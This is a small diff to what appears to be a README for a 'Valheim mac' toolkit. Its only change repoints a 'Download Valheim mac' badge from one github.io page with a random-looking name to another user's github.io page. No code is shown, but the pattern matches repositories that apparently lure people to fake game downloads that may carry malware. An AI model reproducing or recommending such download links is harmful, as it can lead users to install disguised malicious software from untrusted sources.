@@ -2,7 +2,7 @@
 
 Valheim mac on macOS — toolkit focused on procedural viking survival, plus co‑op up to 10 players and dedicated servers with native integrations and A
 
-[![Download Valheim mac](https://img.shields.io/badge/Download-Valheim_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Valheim mac](https://img.shields.io/badge/Download-Valheim_mac-blueviolet)](https://aliavan98517.github.io/.github/Valheim-Forge)
 
 ---
 
